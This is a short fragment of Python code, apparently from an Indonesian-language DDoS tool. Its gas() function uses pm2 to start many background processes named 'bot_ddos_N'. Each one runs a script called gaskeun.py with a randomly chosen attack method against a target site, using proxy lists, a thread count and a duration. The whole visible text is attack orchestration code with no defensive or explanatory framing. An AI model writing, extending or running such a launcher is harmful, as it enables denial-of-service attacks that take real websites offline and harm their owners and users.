...
def gas():
    ...
    for _ in range(jumlah_bot):
        os.system(f'pm2 start gaskeun.py --name=bot_ddos_{_} --interpreter=python3 --restart-delay 30000 -- {random.choice(method).lower()} {target_site} {proxy_types} 1000 proxy_bot_{_}.txt 100 1000')
    print('DONE')
